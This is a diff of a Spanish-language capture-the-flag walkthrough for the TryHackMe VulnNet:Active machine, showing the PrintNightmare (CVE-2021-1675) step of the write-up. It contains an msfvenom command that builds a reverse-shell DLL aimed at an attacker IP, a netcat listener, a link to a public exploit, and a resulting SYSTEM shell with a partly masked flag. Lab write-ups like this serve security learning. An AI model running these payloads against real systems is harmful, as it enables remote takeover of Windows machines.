@@ -297,7 +297,11 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
     Exploit: [+] https://github.com/cube0x0/CVE-2021-1675
     Info sobre PrintNightmare: [+]https://www.hackplayers.com/2021/07/printnightmare-la-enesima-pesadilla-en-windows.html
 
-  1) Nos creamos una dll que nos devulva una reverse shell
+  Proceso completo
+  ![image](https://github.com/Esevka/CTF/assets/139042999/f9a212f8-440c-4827-a8c4-dfa4548044a4)
+
+
+  1) Creamos una dll que ejecute una reverse shell
    
             ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
             └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.92.151 LPORT=1989 -f dll -o esevka.dll
@@ -334,7 +338,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
             [*] Try 2...
             [...]
 
-  5) Obtenemos shell como nt authority\system
+  5) Obtenemos shell y flag  como nt authority\system
 
             ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
             └─# rlwrap nc -lnvp 1989
@@ -347,7 +351,9 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
             C:\Windows\system32>whoami
             nt authority\system
 
-
+            c:\Users\Administrator\Desktop>type system.txt
+            type system.txt
+            THM{d540c0645975900e------aa431fc9b}
 
 ---
 ---> Maquina Vulnnet:Active completa. <---
